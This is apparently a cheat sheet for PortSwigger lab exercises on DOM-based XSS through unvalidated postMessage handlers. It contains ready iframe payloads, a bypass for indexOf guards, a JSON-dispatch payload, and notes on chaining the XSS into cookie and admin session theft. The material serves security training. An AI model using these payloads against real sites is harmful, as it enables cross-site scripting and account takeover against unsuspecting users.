# DOM-based vulnerabilities — Web messages (postMessage)

`window.postMessage()` allows cross-origin communication between iframes/windows. When a page adds a `message` event listener that passes message data to a dangerous sink **without validating `event.origin`**, any iframe can send arbitrary payloads and achieve XSS.

## Quick reference
```javascript
// Exploit: deliver via exploit server iframe
// Lab 1 — innerHTML sink, no origin check
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

// Lab 2 — location.href sink, flawed indexOf check
// Handler: if(message.indexOf('http:')>= 0) location.href = message
// Bypass: http: appears in comment — JS URL executes
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

// Lab 3 — JSON.parse + switch(type) → iframe.src
<iframe src="https://LAB/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## Root cause
`postMessage` with `targetOrigin='*'` delivers to any page. The receiving `addEventListener('message', handler)` uses `event.data` directly in a sink without checking `event.origin`. An attacker-controlled iframe can call `contentWindow.postMessage(payload, '*')` from any origin.

## Find it
1. View page source → search for `addEventListener('message'`.
2. Inspect the handler: does it check `event.origin`? If not → exploitable.
3. Identify the sink: `innerHTML`, `document.write`, `location.href`, `location.assign`, iframe `src`, `eval`.
4. Burp DOM Invader: Sources tab → postMessage → marks untrusted data flows.

## Technique

**Lab 1 — innerHTML sink (no check):**
1. View source → `window.addEventListener('message', e => { document.getElementById('ads').innerHTML = e.data; })`.
2. No `event.origin` check. Sink is `innerHTML` (executes `<img onerror>`).
3. Craft iframe: `<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`.
4. Store on exploit server → deliver to victim.

**Lab 2 — location.href with flawed indexOf:**
1. Handler: `if(m.indexOf('http:')>=0 || m.indexOf('https:')>=0) location.href=m`.
2. Check only looks for `http:` substring — doesn't validate it's at the start.
3. Payload: `javascript:print()//http:` — passes the check (http: appears after //), and `javascript:` URI executes in `location.href`.
4. `<iframe src="https://LAB/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.

**Lab 3 — JSON.parse + switch → iframe.src:**
1. Handler parses JSON: `const msg = JSON.parse(event.data); switch(msg.type) { case 'load-channel': ACMEplayer.element.src = msg.url; }`.
2. No origin check. Setting iframe.src to `javascript:` URI executes JS.
3. Payload JSON: `{"type":"load-channel","url":"javascript:print()"}`.
4. `<iframe src="https://LAB/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`.

## Payload arsenal
```html
<!-- Lab 1: innerHTML -->
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

<!-- Lab 2: JS URL bypass -->
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

<!-- Lab 3: JSON type dispatch -->
<iframe src="https://LAB/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## Bypasses
| Defense | Bypass |
|---|---|
| `if(e.origin === 'expected')` check | No bypass — proper fix. Look for `indexOf` or loose comparison instead |
| indexOf('http:') check | `javascript:print()//http:` — check passes, JS URL executes |
| JSON required | Craft valid JSON with `"url":"javascript:..."` in the expected structure |
| `location.href` only accepts http/https | Depends on browser — some accept `javascript:` in location; try `data:text/html,<script>...` |

## Exploitation walkthrough
**Lab 1:** Spot `innerHTML` sink in source → no origin check → postMessage `<img onerror=print()>` via iframe → XSS.
**Lab 2:** Handler uses `indexOf('http:')` as guard → craft `javascript:print()//http:` → guard passes → JS URL in `location.href` executes.
**Lab 3:** `JSON.parse` + `load-channel` → `iframe.src = url` → send `{"type":"load-channel","url":"javascript:print()"}` → JS executes.

## Chaining
- postMessage XSS → same exploitation chain as stored XSS: steal cookies, extract CSRF tokens, capture passwords.
- If admin visits page with the message listener → admin session theft.

## Tools
- **Burp DOM Invader** — highlights postMessage handlers and their sinks
- **Browser DevTools (Sources)** — set breakpoint on `addEventListener` to inspect handler
- **Exploit server** — host iframe payload

## Labs

### DOM XSS using web messages [Practitioner]
`addEventListener('message')` → `innerHTML = event.data`. No origin check. Iframe + postMessage with `<img src=1 onerror=print()>`. Key insight: postMessage without origin validation = cross-origin injection into any sink.

### DOM XSS using web messages and a JavaScript URL [Practitioner]
Handler: `if(message.indexOf('http:')>=0) location.href = message`. Flawed guard. Payload: `javascript:print()//http:` — `http:` is in the string (passes check), but `javascript:` prefix runs first. Key insight: indexOf presence check ≠ prefix validation.

### DOM XSS using web messages and JSON.parse [Practitioner]
Handler parses JSON, switches on `type`. Case `load-channel` sets iframe.src to `url`. Payload: `{"type":"load-channel","url":"javascript:print()"}`. Key insight: JSON-parsed values still flow to sinks; `javascript:` URI in src executes in iframes.

## Real-world notes
- postMessage without origin validation is endemic in embedded widgets, analytics scripts, and chat integrations.
- `indexOf` checks are the most common bypass — always check what characters appear BEFORE the match.
- Burp DOM Invader catches these faster than manual source review.

## References
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
